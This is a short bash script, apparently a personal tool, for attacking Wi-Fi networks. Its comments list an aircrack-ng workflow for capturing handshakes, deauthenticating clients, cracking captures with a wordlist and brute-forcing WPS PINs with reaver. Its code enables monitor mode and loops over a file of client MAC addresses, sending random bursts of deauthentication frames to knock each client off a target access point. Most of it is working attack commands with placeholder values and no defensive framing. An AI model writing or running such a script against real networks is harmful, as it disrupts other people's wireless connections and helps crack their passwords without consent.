#!/bin/bash

# airmon-ng start wlanX
# airodump-ng -i wlanXmon
# airodump-ng -c <channel - no hopping> --bssid <mac of ap> --write <file> wlanXmon 
# aireplay-ng --deauth 5 -a <mac of ap> -c <client optional> wlanXmon
# aircrack-ng <file.cap> -w <wordlist>
# wash -i wlanXmon
# reaver -i wlanXmon 00:00:00:00:00:00 -vv

# usage ./air.sh <input file>
# input file list of MAC addresses

[[ $(($RANDOM % 2 )) -eq 1 ]] || { echo "Not this time "; exit 1; } 

IFC="wlanX"
AP="00:00:00:00:00:00"
CHANNEL="X"
DEAUTH=5

MON=`cat /sys/class/net/$IFC"mon"/operstate`
if [ "$MON" != "unknown" ] ; then
        echo "enabling mon interface"
        airmon-ng start $IFC $CHANNEL
fi

while IFS='' read -r line || [[ -n "$line" ]]; do
        aireplay-ng --deauth $(( $RANDOM % $DEAUTH + 1)) -a $AP -c $line $IFC"mon"
done < "$1"
